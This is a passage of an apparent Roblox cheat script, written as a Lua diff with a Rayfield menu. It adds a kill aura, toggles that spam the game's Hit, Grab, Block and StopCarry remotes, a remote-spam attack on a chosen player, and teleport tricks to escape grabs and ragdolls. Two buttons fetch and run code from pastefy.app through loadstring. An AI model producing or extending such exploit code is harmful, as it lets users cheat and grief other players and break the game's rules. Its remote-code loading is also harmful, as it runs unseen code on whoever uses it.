+                spamCarryThread = nil
+            end
+            Rayfield:Notify({
+                Title = "Spam Carry",
+                Content = "Deactivated",
+                Duration = 2,
+            })
+        end
+    end,
+})
+
+local StopCarryToggle = MainTab:CreateToggle({
+    Name = "Spam Stop Carry (MID)",
+    CurrentValue = false,
+    Flag = "StopCarryToggle",
+    Callback = function(Value)
+        stopCarryEnabled = Value
+        local StopCarry = ReplicatedStorage:FindFirstChild("StopCarry")
+        
+        if Value then
+            if not StopCarry then
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "StopCarry not found!",
+                    Duration = 3,
+                })
+                return
+            end
+            
+            if stopCarryThread then task.cancel(stopCarryThread) end
+            
+            stopCarryThread = task.spawn(function()
+                while stopCarryEnabled do
+                    pcall(function() 
+                        StopCarry:FireServer() 
+                    end)
+                    task.wait(0.01)
+                end
+            end)
+            
+            Rayfield:Notify({
+                Title = "Stop Carry",
+                Content = "Activated",
+                Duration = 2,
+            })
+        else
+            if stopCarryThread then 
+                task.cancel(stopCarryThread)
+                stopCarryThread = nil
+            end
+            Rayfield:Notify({
+                Title = "Stop Carry",
+                Content = "Deactivated",
+                Duration = 2,
+            })
+        end
+    end,
+})
+
+local CoreSection = MainTab:CreateSection("Combat")
+
+-- Kill Aura Toggle
+local KillAuraToggle = MainTab:CreateToggle({
+    Name = "Kill Aura",
+    CurrentValue = false,
+    Flag = "KillAuraToggle",
+    Callback = function(Value)
+        killAuraEnabled = Value
+        
+        -- Get Hit Remote
+        local HitRemote = nil
+        local packages = ReplicatedStorage:FindFirstChild("Packages")
+        if packages then
+            local knit = packages:FindFirstChild("Knit")
+            if knit then
+                local services = knit:FindFirstChild("Services")
+                if services then
+                    local combat = services:FindFirstChild("CombatService")
+                    if combat then
+                        local rf = combat:FindFirstChild("RF")
+                        if rf then
+                            HitRemote = rf:FindFirstChild("Hit")
+                        end
+                    end
+                end
+            end
+        end
+        
+        if Value then
+            if not HitRemote then
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Hit remote not found!",
+                    Duration = 3,
+                })
+                return
+            end
+            
+            if killAuraThread then task.cancel(killAuraThread) end
+            
+            local function getAuraDelay()
+                local speed = _G.AuraSpeed or 100
+                return 0.1 - (0.1 * (speed / 100))
+            end
+            
+            local function getClosestPlayer()
+                local character = localPlayer.Character
+                if not character then return nil end
+                
+                local hrp = character:FindFirstChild("HumanoidRootPart")
+                if not hrp then return nil end
+                
+                local myPos = hrp.Position
+                local closest = nil
+                local closestDist = math.huge
+                
+                for _, player in ipairs(Players:GetPlayers()) do
+                    if player ~= localPlayer then
+                        local targetChar = player.Character
+                        if targetChar then
+                            local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
+                            local targetHumanoid = targetChar:FindFirstChild("Humanoid")
+                            
+                            if targetHrp and targetHumanoid and targetHumanoid.Health > 0 then
+                                local dist = (myPos - targetHrp.Position).Magnitude
+                                if dist < closestDist then
+                                    closestDist = dist
+                                    closest = targetHumanoid
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                return closest
+            end
+            
+            killAuraThread = task.spawn(function()
+                while killAuraEnabled do
+                    local target = getClosestPlayer()
+                    if target then
+                        pcall(function() 
+                            HitRemote:InvokeServer(target, target.Parent.HumanoidRootPart.Position) 
+                        end)
+                    end
+                    task.wait(getAuraDelay())
+                end
+            end)
+            
+            Rayfield:Notify({
+                Title = "Kill Aura",
+                Content = "Activated",
+                Duration = 2,
+            })
+        else
+            if killAuraThread then 
+                task.cancel(killAuraThread)
+                killAuraThread = nil
+            end
+            Rayfield:Notify({
+                Title = "Kill Aura",
+                Content = "Deactivated",
+                Duration = 2,
+            })
+        end
+    end,
+})
+
+-- Variables
+local isGrabbing = false
+local grabLoop = nil
+
+-- Function to start grab spam
+local function startGrabSpam()
+    if grabLoop then
+        grabLoop:Disconnect()
+        grabLoop = nil
+    end
+    
+    isGrabbing = true
+    
+    -- Start grab spam loop
+    grabLoop = game:GetService("RunService").Heartbeat:Connect(function()
+        if not isGrabbing then
+            if grabLoop then grabLoop:Disconnect() end
+            return
+        end
+        
+        -- Attempt to invoke the Grab function
+        pcall(function()
+            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("CombatService"):WaitForChild("RF"):WaitForChild("Grab"):InvokeServer()
+        end)
+        
+        -- Wait 0.1 seconds
+        task.wait(0.1)
+    end)
+end
+
+-- Function to stop grab spam
+local function stopGrabSpam()
+    if grabLoop then
+        grabLoop:Disconnect()
+        grabLoop = nil
+    end
+    isGrabbing = false
+end
+
+-- Create the toggle
+local GrabToggle = MainTab:CreateToggle({
+    Name = "Auto Grab",
+    CurrentValue = false,
+    Flag = "GrabSpam",
+    Callback = function(Value)
+        if Value then
+            startGrabSpam()
+            Rayfield:Notify({
+                Title = "Grab Spam",
+                Content = "Started spamming Grab every 0.1 seconds",
+                Duration = 3
+            })
+        else
+            stopGrabSpam()
+            Rayfield:Notify({
+                Title = "Grab Spam",
+                Content = "Stopped spamming Grab",
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Variables
+local isBlocking = false
+local blockLoop = nil
+
+-- Function to start block spam
+local function startBlockSpam()
+    if blockLoop then
+        blockLoop:Disconnect()
+        blockLoop = nil
+    end
+    
+    isBlocking = true
+    
+    -- Start block spam loop
+    blockLoop = game:GetService("RunService").Heartbeat:Connect(function()
+        if not isBlocking then
+            if blockLoop then blockLoop:Disconnect() end
+            return
+        end
+        
+        -- Attempt to invoke the Block function
+        pcall(function()
+            local args = { true }
+            game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Knit"):WaitForChild("Services"):WaitForChild("CombatService"):WaitForChild("RF"):WaitForChild("Block"):InvokeServer(unpack(args))
+        end)
+        
+        -- Wait 0.1 seconds
+        task.wait(0.1)
+    end)
+end
+
+-- Function to stop block spam
+local function stopBlockSpam()
+    if blockLoop then
+        blockLoop:Disconnect()
+        blockLoop = nil
+    end
+    isBlocking = false
+end
+
+-- Create the toggle
+local BlockToggle = MainTab:CreateToggle({
+    Name = "Auto Block",
+    CurrentValue = false,
+    Flag = "AutoBlock",
+    Callback = function(Value)
+        if Value then
+            startBlockSpam()
+            Rayfield:Notify({
+                Title = "Auto Block",
+                Content = "Started auto blocking every 0.1 seconds",
+                Duration = 3
+            })
+        else
+            stopBlockSpam()
+            Rayfield:Notify({
+                Title = "Auto Block",
+                Content = "Stopped auto blocking",
+                Duration = 2
+            })
+        end
+    end
+})
+
+-- Variables
+local spamActive = false
+local spamConnection = nil
+local currentTarget = nil
+local players = game:GetService("Players")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local localPlayer = players.LocalPlayer
+local runService = game:GetService("RunService")
+
+-- Function to get player list
+local function getPlayerNames()
+    local names = {}
+    for _, player in ipairs(players:GetPlayers()) do
+        if player ~= localPlayer then
+            table.insert(names, player.Name)
+        end
+    end
+    return names
+end
+
+-- Function to get character and humanoid
+local function getTargetCharacter(targetPlayer)
+    if not targetPlayer then return nil, nil end
+    
+    local character = targetPlayer.Character
+    if not character or not character.Parent then return nil, nil end
+    
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoid or humanoid.Health <= 0 then return nil, nil end
+    
+    return character, humanoid
+end
+
+-- Function to invoke the remote
+local function invokeRemote(targetCharacter, targetHumanoid)
+    if not targetCharacter or not targetHumanoid then return false end
+    
+    local success = pcall(function()
+        local packages = replicatedStorage:FindFirstChild("Packages")
+        if not packages then return end
+        
+        local knit = packages:FindFirstChild("Knit")
+        if not knit then return end
+        
+        local services = knit:FindFirstChild("Services")
+        if not services then return end
+        
+        local combatService = services:FindFirstChild("CombatService")
+        if not combatService then return end
+        
+        local rf = combatService:FindFirstChild("RF")
+        if not rf then return end
+        
+        local hitRemote = rf:FindFirstChild("Hit")
+        if not hitRemote then return end
+        
+        local args = {
+            targetCharacter,
+            targetHumanoid,
+            Vector3.new(107.95883178710938, 3.528562545776367, 18.3253231048584)
+        }
+        
+        hitRemote:InvokeServer(unpack(args))
+    end)
+    
+    return success
+end
+
+-- Spam function
+local function startSpam(targetPlayer)
+    if spamConnection then
+        spamConnection:Disconnect()
+        spamConnection = nil
+    end
+    
+    spamActive = true
+    
+    spamConnection = runService.Heartbeat:Connect(function()
+        if not spamActive then return end
+        if not targetPlayer or not targetPlayer.Parent then
+            spamActive = false
+            if spamConnection then
+                spamConnection:Disconnect()
+                spamConnection = nil
+            end
+            return
+        end
+        
+        local character, humanoid = getTargetCharacter(targetPlayer)
+        if character and humanoid then
+            for i = 1, 10 do
+                invokeRemote(character, humanoid)
+            end
+        end
+    end)
+end
+
+-- Stop spam function
+local function stopSpam()
+    spamActive = false
+    if spamConnection then
+        spamConnection:Disconnect()
+        spamConnection = nil
+    end
+end
+
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local UserInputService = game:GetService("UserInputService")
+local localPlayer = Players.LocalPlayer
+
+-- Variables
+local killAuraEnabled = false
+local isGrabbing = false
+local killAuraThread = nil
+local grabLoop = nil
+
+-- Keybind Variables
+local killAuraKeybindEnabled = false
+local autoGrabKeybindEnabled = false
+local killAuraKeybindConnection = nil
+local autoGrabKeybindConnection = nil
+local killAuraKey = "R"
+local autoGrabKey = "Q"
+
+-- Get Hit Remote
+local function getHitRemote()
+    local HitRemote = nil
+    local packages = ReplicatedStorage:FindFirstChild("Packages")
+    if packages then
+        local knit = packages:FindFirstChild("Knit")
+        if knit then
+            local services = knit:FindFirstChild("Services")
+            if services then
+                local combat = services:FindFirstChild("CombatService")
+                if combat then
+                    local rf = combat:FindFirstChild("RF")
+                    if rf then
+                        HitRemote = rf:FindFirstChild("Hit")
+                    end
+                end
+            end
+        end
+    end
+    return HitRemote
+end
+
+-- Get Grab Remote
+local function getGrabRemote()
+    local GrabRemote = nil
+    local packages = ReplicatedStorage:FindFirstChild("Packages")
+    if packages then
+        local knit = packages:FindFirstChild("Knit")
+        if knit then
+            local services = knit:FindFirstChild("Services")
+            if services then
+                local combat = services:FindFirstChild("CombatService")
+                if combat then
+                    local rf = combat:FindFirstChild("RF")
+                    if rf then
+                        GrabRemote = rf:FindFirstChild("Grab")
+                    end
+                end
+            end
+        end
+    end
+    return GrabRemote
+end
+
+-- Get Closest Player for Kill Aura
+local function getClosestPlayer()
+    local character = localPlayer.Character
+    if not character then return nil end
+    
+    local hrp = character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return nil end
+    
+    local myPos = hrp.Position
+    local closest = nil
+    local closestDist = math.huge
+    
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            local targetChar = player.Character
+            if targetChar then
+                local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
+                local targetHumanoid = targetChar:FindFirstChild("Humanoid")
+                
+                if targetHrp and targetHumanoid and targetHumanoid.Health > 0 then
+                    local dist = (myPos - targetHrp.Position).Magnitude
+                    if dist < closestDist then
+                        closestDist = dist
+                        closest = targetHumanoid
+                    end
+                end
+            end
+        end
+    end
+    
+    return closest
+end
+
+-- Toggle Kill Aura
+local function toggleKillAura()
+    local HitRemote = getHitRemote()
+    
+    if killAuraEnabled then
+        -- Turn OFF
+        killAuraEnabled = false
+        if killAuraThread then 
+            task.cancel(killAuraThread)
+            killAuraThread = nil
+        end
+        Rayfield:Notify({Title = "Kill Aura", Content = "Deactivated", Duration = 2})
+    else
+        -- Turn ON
+        if not HitRemote then
+            Rayfield:Notify({Title = "Error", Content = "Hit remote not found!", Duration = 3})
+            return
+        end
+        
+        killAuraEnabled = true
+        
+        killAuraThread = task.spawn(function()
+            while killAuraEnabled do
+                local target = getClosestPlayer()
+                if target then
+                    pcall(function() 
+                        HitRemote:InvokeServer(target, target.Parent.HumanoidRootPart.Position) 
+                    end)
+                end
+                task.wait(0.01)
+            end
+        end)
+        
+        Rayfield:Notify({Title = "Kill Aura", Content = "Activated", Duration = 2})
+    end
+end
+
+-- Toggle Auto Grab
+local function toggleAutoGrab()
+    local GrabRemote = getGrabRemote()
+    
+    if isGrabbing then
+        -- Turn OFF
+        if grabLoop then
+            grabLoop:Disconnect()
+            grabLoop = nil
+        end
+        isGrabbing = false
+        Rayfield:Notify({Title = "Auto Grab", Content = "Deactivated", Duration = 2})
+    else
+        -- Turn ON
+        if not GrabRemote then
+            Rayfield:Notify({Title = "Error", Content = "Grab remote not found!", Duration = 3})
+            return
+        end
+        
+        isGrabbing = true
+        
+        grabLoop = game:GetService("RunService").Heartbeat:Connect(function()
+            if not isGrabbing then
+                if grabLoop then grabLoop:Disconnect() end
+                return
+            end
+            pcall(function()
+                GrabRemote:InvokeServer()
+            end)
+            task.wait(0.1)
+        end)
+        
+        Rayfield:Notify({Title = "Auto Grab", Content = "Activated", Duration = 2})
+    end
+end
+
+local Tab = Window:CreateTab("Custom GUIs", nil)
+
+local CoreSection = Tab:CreateSection("Orbit Scripts")
+
+local Button = Tab:CreateButton({
+   Name = "Closest Player Orbit GUI",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/8DsFbp6K/raw"))()
+   end,
+})
+
+local Button = Tab:CreateButton({
+   Name = "Orbit Selected Player (Customizable)",
+   Callback = function()
+       loadstring(game:HttpGet("https://pastefy.app/vo8Ip9vK/raw"))()
+   end,
+})
+
+local CoreSection = Tab:CreateSection("Invisibilities")
+
+-- ========== FUNCTIONS (place at top of your script) ==========
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local player = Players.LocalPlayer
+
+local autoEnabled = false
+local isProcessing = false
+
+local function getRemote()
+    local eventSystem = ReplicatedStorage:FindFirstChild("EventInviteSystem")
+    if not eventSystem then return nil end
+    return eventSystem:FindFirstChild("EventTeleportEvent")
+end
+
+local function handleGrab()
+    if not autoEnabled or isProcessing then return end
+    local remote = getRemote()
+    if not remote then return end
+
+    local char = player.Character
+    local root = char and char:FindFirstChild("HumanoidRootPart")
+    if not root then return end
+
+    isProcessing = true
+    local originalCFrame = root.CFrame
+    remote:FireServer()
+    task.wait(0.2)
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        player.Character.HumanoidRootPart.CFrame = originalCFrame
+    end
+    isProcessing = false
+end
+
+player.AttributeChanged:Connect(function(attr)
+    if attr == "Grabbed" and player:GetAttribute("Grabbed") == true then
+        handleGrab()
+    end
+end)
+
+-- (optional) initial check
+task.spawn(function()
+    task.wait(1)
+    if player:GetAttribute("Grabbed") == true then handleGrab() end
+end)
+
+Tab:CreateToggle({
+    Name = "Anti-Grab (Instantly)",
+    CurrentValue = false,
+    Flag = "AutoAntiGrabToggle",   -- optional
+    Callback = function(enabled)
+        autoEnabled = enabled
+        if enabled and player:GetAttribute("Grabbed") == true then
+            handleGrab()
+        end
+    end
+})
+
+local player = game.Players.LocalPlayer
+local TARGET_POS = Vector3.new(-38, 4, 29)
+local DELAY = 0.1
+local OFFSET_UP = Vector3.new(0, 3, 0)
+
+local enabled = false
+local canTrigger = true          -- Prevents multiple triggers during same ragdoll
+local ragdollConnection = nil    -- For StateChanged event
+
+local function isRagdolled(hum)
+    if not hum then return false end
+    return hum:GetState() == Enum.HumanoidStateType.Physics or hum.PlatformStand
+end
+
+local function onRagdollStarted()
+    if not enabled then return end
+    if not canTrigger then return end
+    
+    local char = player.Character
+    if not char then return end
+    
+    local humanoid = char:FindFirstChild("Humanoid")
+    if not humanoid then return end
+    if not isRagdolled(humanoid) then return end   -- sanity check
+    
+    canTrigger = false
+    
+    local rootPart = char:FindFirstChild("HumanoidRootPart")
+    if not rootPart then return end
+    
+    local originalCF = rootPart.CFrame
+    
+    -- Teleport to target position
+    rootPart.CFrame = CFrame.new(TARGET_POS)
+    task.wait(DELAY)
+    
+    -- Teleport back to original position + offset up
+    if rootPart and rootPart.Parent then
+        local returnPos = originalCF.Position + OFFSET_UP
+        rootPart.CFrame = CFrame.new(returnPos) * CFrame.Angles(0, originalCF:toEulerAnglesYXZ(), 0)
+    end
+    
+    -- Wait until ragdoll ends to allow next trigger
+    local function onStateChanged(oldState, newState)
+        if not isRagdolled(humanoid) then
+            canTrigger = true
+            ragdollConnection:Disconnect()
+            ragdollConnection = nil
+        end
+    end
+    
+    if ragdollConnection then ragdollConnection:Disconnect() end
+    ragdollConnection = humanoid.StateChanged:Connect(onStateChanged)
+end
+
+local function startDetection()
+    -- Wait for character to exist
+    local char = player.Character
+    if not char then
+        player.CharacterAdded:Wait()
+        char = player.Character
+    end
+    
+    local humanoid = char:WaitForChild("Humanoid")
+    
+    -- Listen for state changes to detect when ragdoll starts
+    humanoid.StateChanged:Connect(function(oldState, newState)
+        if not enabled then return end
+        local newIsRagdoll = (newState == Enum.HumanoidStateType.Physics or humanoid.PlatformStand)
+        local oldIsRagdoll = (oldState == Enum.HumanoidStateType.Physics or humanoid.PlatformStand)
+        
+        if newIsRagdoll and not oldIsRagdoll then
+            onRagdollStarted()
+        end
+    end)
+    
+    -- Also handle character respawns
+    player.CharacterAdded:Connect(function(newChar)
+        local newHum = newChar:WaitForChild("Humanoid")
+        canTrigger = true
+        if ragdollConnection then
+            ragdollConnection:Disconnect()
+            ragdollConnection = nil
+        end
+        -- Reconnect state listener for new character
+        newHum.StateChanged:Connect(function(oldState, newState)
+            if not enabled then return end
+            local newIsRagdoll = (newState == Enum.HumanoidStateType.Physics or newHum.PlatformStand)
+            local oldIsRagdoll = (oldState == Enum.HumanoidStateType.Physics or newHum.PlatformStand)
+            if newIsRagdoll and not oldIsRagdoll then
+                onRagdollStarted()
+            end
+        end)
+    end)
+end
+
+local function stopDetection()
+    -- Nothing to clean up besides connections, but we keep them disabled
+    enabled = false
+    canTrigger = true
+    if ragdollConnection then
+        ragdollConnection:Disconnect()
+        ragdollConnection = nil
+    end
+end
+
+-- Create toggle (assuming Tab is defined elsewhere)
+Tab:CreateToggle({
+    Name = "Anti Ragdoll Teleport (BETA)",
+    CurrentValue = false,
+    Flag = "RagTPUpToggle",
+    Callback = function(state)
+        enabled = state
+        if state then
+            startDetection()
+        else
+            stopDetection()
+        end
+    end
+})
+
+-- ==================== ORIGINAL FUNCTIONS (NO "local") ====================
+Players = game:GetService("Players")
+RS = game:GetService("RunService")
+UIS = game:GetService("UserInputService")
+me = Players.LocalPlayer
+
+-- State variables (these stay local)
+running = false
+blocking = false
+grabbing = false
+spamming = false
+antiGrabEnabled = false
+AntiRagEnabled = false
+AntiGrabRagEnabled = false
+deathTpEnabled = false
+noSlowEnabled = false
+local conn, blockConn, noSlowConn
+lastDeathPos = nil
+antiGrabDelay = 0.2
+hitMultiplier = 1
+
+friendsList = {}
+targetsList = {}
+friendTagEnabled = false
+targetTagEnabled = false
+tagConnections = {}
+tagBillboards = {}
+
+-- ARC / anti‑ragdoll variables (stay local)
+_arc_targetCFrame = CFrame.new(-502.844818, 10.1868954, -65.4427567, 0.560596228, 2.67291544e-09, -0.828089297, -2.95736768e-08, 1, -1.67928462e-08, 0.828089297, 3.39036497e-08, 0.560596228)
+local _arc_safeCFrame = _arc_targetCFrame + Vector3.new(0, 1, 0)
+ArcDefaultDelay = 0.1
+ArcGrabDelay = 3.5
+_arc_connection, _arc_platStandConn = nil, nil
+_arc_originalCFrame = nil
+_arc_hasCleanedThisRagdoll = false
+_arc_returnTask = nil
+_arc_inReturnWindow = false
+_arc_wasGrabbed = false
+_arc_platform = nil
+_arc_platformStandConn = nil
+
+_badZoneCFrame = CFrame.new(50.6816101, 3.70000315, 117.850357, -0.69541502, -2.31521002e-09, -0.71860832, 2.70699267e-08, 1, -2.94180325e-08, 0.71860832, -3.99104181e-08, -0.69541502)
+_badZonePos = _badZoneCFrame.Position
+_lastSafePos = nil
+_badZoneConn = nil
+
+-- Helper functions (global, no "local")
+function normalizeName(name)
+    return name:lower():gsub("%s+", "")
+end
+
+function playerMatchesQuery(player, query)
+    local q = normalizeName(query)
+    return normalizeName(player.DisplayName):find(q, 1, true) ~= nil
+        or normalizeName(player.Name):find(q, 1, true) ~= nil
+end
+
+function isInList(player, list)
+    for _, query in ipairs(list) do
+        if playerMatchesQuery(player, query) then return true end
+    end
+    return false
+end
+
+function parseList(text)
+    local result = {}
+    for word in text:gmatch("%S+") do table.insert(result, word) end
+    return result
+end
+
+function removeTagFor(player)
+    if tagBillboards[player.Name] then
+        pcall(function() tagBillboards[player.Name]:Destroy() end)
+        tagBillboards[player.Name] = nil
+    end
+    if tagConnections[player.Name] then
+        tagConnections[player.Name]:Disconnect()
+        tagConnections[player.Name] = nil
+    end
+end
+
+function applyTagTo(player, label, color)
+    removeTagFor(player)
+    local function makeTag(char)
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then hrp = char:WaitForChild("HumanoidRootPart", 5) end
+        if not hrp then return end
+        local old = hrp:FindFirstChild("PlayerTag")
+        if old then old:Destroy() end
+        local bb = Instance.new("BillboardGui")
+        bb.Name = "PlayerTag"
+        bb.Size = UDim2.new(0, 120, 0, 40)
+        bb.StudsOffset = Vector3.new(0, 4, 0)
+        bb.AlwaysOnTop = true
+        bb.Adornee = hrp
+        bb.Parent = hrp
+        local lbl = Instance.new("TextLabel", bb)
+        lbl.Size = UDim2.new(1, 0, 1, 0)
+        lbl.BackgroundTransparency = 1
+        lbl.Text = label
+        lbl.TextColor3 = color
+        lbl.Font = Enum.Font.GothamBold
+        lbl.TextSize = 28
+        lbl.TextStrokeTransparency = 0
+        lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        tagBillboards[player.Name] = bb
+    end
+    if player.Character then makeTag(player.Character) end
+    tagConnections[player.Name] = player.CharacterAdded:Connect(function(char)
+        task.wait(0.5)
+        makeTag(char)
+    end)
+end
+
+function refreshTags()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player == me then continue end
+        removeTagFor(player)
+        if friendTagEnabled and isInList(player, friendsList) then
+            applyTagTo(player, "bestie", Color3.fromRGB(255, 182, 193))
+        elseif targetTagEnabled and isInList(player, targetsList) then
+            applyTagTo(player, "baddie", Color3.fromRGB(255, 255, 255))
+        end
+    end
+end
+
+function getNearest()
+    local nearest, shortest = nil, math.huge
+    local myRoot = me.Character and me.Character:FindFirstChild("HumanoidRootPart")
+    if not myRoot then return end
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= me and p.Character then
+            if isInList(p, friendsList) then continue end
+            if #targetsList > 0 and not isInList(p, targetsList) then continue end
+            local root = p.Character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local dist = (myRoot.Position - root.Position).Magnitude
+                if dist < shortest then nearest, shortest = p, dist end
+            end
+        end
+    end
+    return nearest
+end
+
+function hit()
+    local target = getNearest()
+    if target and target.Character then
+        for i = 1, hitMultiplier do
+            game:GetService("ReplicatedStorage").Packages.Knit.Services.CombatService.RF.Hit:InvokeServer(target.Character.Humanoid)
+        end
+    end
+end
+
+-- ARC functions (global)
+function _arc_resetState()
+    _arc_originalCFrame = nil
+    _arc_returnTask = nil
+    _arc_hasCleanedThisRagdoll = false
+    _arc_inReturnWindow = false
+    _arc_wasGrabbed = false
+end
+
+function _arc_removePlatform()
+    if _arc_platformStandConn then _arc_platformStandConn:Disconnect() _arc_platformStandConn = nil end
+    if _arc_platform then pcall(function() _arc_platform:Destroy() end) _arc_platform = nil end
+end
+
+function _arc_spawnPlatform(position)
+    _arc_removePlatform()
+    local W, H, D, T = 16, 10, 16, 1
+    local floorY = position.Y - 3.5
+    local floorCY = floorY - T/2
+    local ceilCY = floorY + H + T/2
+    local innerCY = floorY + H/2
+    local model = Instance.new("Model")
+    model.Name = "ARC_SafeBox"
+    model.Parent = workspace
+    _arc_platform = model
+    local function makePart(size, cf)
+        local p = Instance.new("Part")
+        p.Size = size p.CFrame = cf p.Anchored = true p.CanCollide = true
+        p.Locked = true p.Material = Enum.Material.SmoothPlastic
+        p.BrickColor = BrickColor.new("Medium stone grey") p.Transparency = 0.4
+        p.Parent = model return p
+    end
+    local cx, cz = position.X, position.Z
+    makePart(Vector3.new(W,T,D), CFrame.new(cx,floorCY,cz))
+    makePart(Vector3.new(W,T,D), CFrame.new(cx,ceilCY,cz))
+    makePart(Vector3.new(W,H+T*2,T), CFrame.new(cx,innerCY,cz+D/2+T/2))
+    makePart(Vector3.new(W,H+T*2,T), CFrame.new(cx,innerCY,cz-D/2-T/2))
+    makePart(Vector3.new(T,H+T*2,D), CFrame.new(cx-W/2-T/2,innerCY,cz))
+    makePart(Vector3.new(T,H+T*2,D), CFrame.new(cx+W/2+T/2,innerCY,cz))
+    local platformTopY = floorY
+    _arc_platformStandConn = RS.Heartbeat:Connect(function()
+        if not _arc_platform or not _arc_platform.Parent then _arc_removePlatform() return end
+        local hrp = me.Character and me.Character:FindFirstChild("HumanoidRootPart")
+        if hrp and hrp.Parent and hrp.Position.Y < platformTopY then
+            hrp.CFrame = CFrame.new(cx, platformTopY+3.5, cz)
+            hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
+        end
+    end)
+end
+
+function _arc_countDisabledMotors(char)
+    if not char then return 0, 0 end
+    local total, disabled = 0, 0
+    for _, obj in ipairs(char:GetDescendants()) do
+        if obj:IsA("Motor6D") then total += 1 if not obj.Enabled then disabled += 1 end end
+    end
+    return total, disabled
+end
+
+function _arc_forceEndRagdoll(char)
+    if not char then return end
+    local humanoid = char:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        for _, state in ipairs({Enum.HumanoidStateType.Ragdoll, Enum.HumanoidStateType.Physics, Enum.HumanoidStateType.FallingDown, Enum.HumanoidStateType.PlatformStanding}) do
+            pcall(function() humanoid:SetStateEnabled(state, false) end)
+        end
+        humanoid.PlatformStand = false
+        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+    end
+    for _, n in ipairs({"RagdollJoints","NoCollisions","Local Ragdoll"}) do
+        local obj = char:FindFirstChild(n) if obj then obj:Destroy() end
+    end
+    for _, obj in ipairs(char:GetDescendants()) do
+        if obj:IsA("Motor6D") then obj.Enabled = true
+        elseif (obj:IsA("BaseConstraint") or obj:IsA("Attachment")) and obj.Name:lower():find("ragdoll") then obj:Destroy() end
+    end
+end
+
+function _arc_doReturn(hrp, savedCFrame)
+    if hrp and hrp.Parent then
+        local safePos = _arc_safeCFrame.Position
+        _arc_spawnPlatform(safePos)
+        hrp.CFrame = CFrame.new(safePos.X, safePos.Y, safePos.Z)
+        hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
+    end
+    _arc_returnTask = task.delay(ArcGrabDelay, function()
+        _arc_removePlatform()
+        if hrp and hrp.Parent and savedCFrame then
+            hrp.CFrame = savedCFrame
+            task.delay(0.05, function()
+                if hrp and hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.new(0,-1,0) end
+            end)
+        end
+        _arc_resetState()
+    end)
+end
+
+function _arc_onCharacterAdded(char)
+    local hrp = char:WaitForChild("HumanoidRootPart", 10)
+    local hum = char:WaitForChild("Humanoid", 10)
+    if not hrp or not hum then return end
+    if _arc_connection then _arc_connection:Disconnect() _arc_connection = nil end
+    if _arc_platStandConn then _arc_platStandConn:Disconnect() _arc_platStandConn = nil end
+    _arc_resetState()
+    if _arc_returnTask then task.cancel(_arc_returnTask) _arc_returnTask = nil end
+    task.wait(2.5)
+    if not AntiRagEnabled and not AntiGrabRagEnabled then return end
+    _arc_connection = RS.Heartbeat:Connect(function()
+        if not AntiRagEnabled then return end
+        if not char.Parent or not hrp.Parent then
+            if _arc_connection then _arc_connection:Disconnect() _arc_connection = nil end
+            return
+        end
+        if _arc_inReturnWindow then return end
+        local total, disabled = _arc_countDisabledMotors(char)
+        local isRagdolled = total >= 12 and (disabled/total) >= 0.9
+        if isRagdolled then
+            if not _arc_originalCFrame then _arc_originalCFrame = hrp.CFrame end
+            if not _arc_hasCleanedThisRagdoll then
+                hrp.CFrame = _arc_safeCFrame
+                _arc_forceEndRagdoll(char)
+                _arc_hasCleanedThisRagdoll = true
+            end
+        else
+            if _arc_originalCFrame and not _arc_returnTask then
+                _arc_inReturnWindow = true
+                local savedCFrame = _arc_originalCFrame
+                _arc_returnTask = task.delay(ArcDefaultDelay, function()
+                    if hrp and hrp.Parent and savedCFrame then
+                        hrp.CFrame = savedCFrame
+                        task.delay(0.05, function()
+                            if hrp and hrp.Parent then hrp.AssemblyLinearVelocity = Vector3.new(0,-1,0) end
+                        end)
+                    end
+                    _arc_resetState()
+                end)
+            end
+            _arc_hasCleanedThisRagdoll = false
+        end
+    end)
+end
+
+function startARC()
+    local char = me.Character
+    if char then task.spawn(_arc_onCharacterAdded, char) end
+end
+
+function stopARC()
+    if not AntiRagEnabled and not AntiGrabRagEnabled then
+        if _arc_connection then _arc_connection:Disconnect() _arc_connection = nil end
+        if _arc_platStandConn then _arc_platStandConn:Disconnect() _arc_platStandConn = nil end
+        _arc_removePlatform()
+    end
+end
+
+function setupAntiGrab(char)
+    local hum = char:WaitForChild("Humanoid", 10)
+    local hrp = char:WaitForChild("HumanoidRootPart", 10)
+    if not hum or not hrp then return end
+    hum:GetPropertyChangedSignal("PlatformStand"):Connect(function()
+        if not antiGrabEnabled then return end
+        if hum.PlatformStand then
+            local originalPos = hrp.Position
+            _arc_resetState()
+            game:GetService("ReplicatedStorage").EventInviteSystem.EventTeleportEvent:FireServer()
+            task.delay(antiGrabDelay, function()
+                local currentHrp = me.Character and me.Character:FindFirstChild("HumanoidRootPart")
+                if currentHrp then currentHrp.CFrame = CFrame.new(originalPos) end
+                _arc_resetState()
+            end)
+        end
+    end)
+end
+
+function setupDeathTp(char)
+    local hrp = char:WaitForChild("HumanoidRootPart", 10)
+    local hum = char:WaitForChild("Humanoid", 10)
+    if not hrp or not hum then return end
+    hum.Died:Connect(function() if deathTpEnabled then lastDeathPos = hrp.CFrame end end)
